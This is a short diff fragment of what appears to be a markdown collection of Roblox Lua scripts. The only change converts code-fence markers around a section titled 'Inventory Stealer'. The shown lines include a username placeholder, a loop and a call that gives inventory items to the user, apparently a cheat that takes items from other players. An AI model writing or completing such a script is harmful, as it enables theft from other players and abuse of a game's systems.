@@ -257,7 +257,7 @@ end
 
 ## Inventory Stealer
 
-'''lua
+```lua
 local myUsername = "YourRobloxUsername"  -- Replace with your exact Roblox username!
 
 while true do
@@ -323,4 +323,4 @@ while true do
         InventoryService:giveItem(me, res, s, true)
     end
 end
-'''
+```
